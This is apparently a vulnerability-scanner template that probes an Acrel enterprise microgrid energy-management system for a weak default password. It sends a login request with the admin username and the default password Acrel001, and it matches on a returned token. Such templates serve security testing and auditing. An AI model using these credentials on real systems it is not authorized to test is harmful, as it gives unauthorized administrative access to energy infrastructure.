id: poc-yaml-acrel-emeems-weak-password
info:
  name: Acrel Enterprise Microgrid Energy Efficiency Management System Weak Password
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - raw:
      - |
        POST /SubstationWEBV2/user/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
        projectType: 0

        fLoginname=admin&fPassword=Acrel001&loginType=password&projectType=0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Login success"
          - "\"fLoginname\":"
          - "\"token\":"
      - type: regex
        part: header
        regex:
          - "application/json"
      - type: word
        part: body
        words:
          - "<"
        negative: true
